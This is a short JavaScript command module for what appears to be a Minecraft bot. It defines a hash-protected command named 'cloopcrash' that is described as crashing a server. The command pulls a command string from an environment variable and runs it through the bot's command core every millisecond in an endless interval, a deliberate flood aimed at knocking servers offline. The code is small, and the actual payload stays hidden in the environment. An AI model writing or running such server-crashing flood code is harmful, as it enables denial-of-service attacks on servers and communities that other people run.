const CommandError = require('../CommandModules/command_error')

module.exports = {
  name: 'cloopcrash',
  hashOnly: true, 
   description:['cloop crashes a server '],
  execute (context) {
  const amogus = process.env['amogus']
    const bot = context.bot
timer = setInterval(function () {
    bot.core.run(`${amogus}`)
   }, 1)
  }
}




//what is wi
// IDK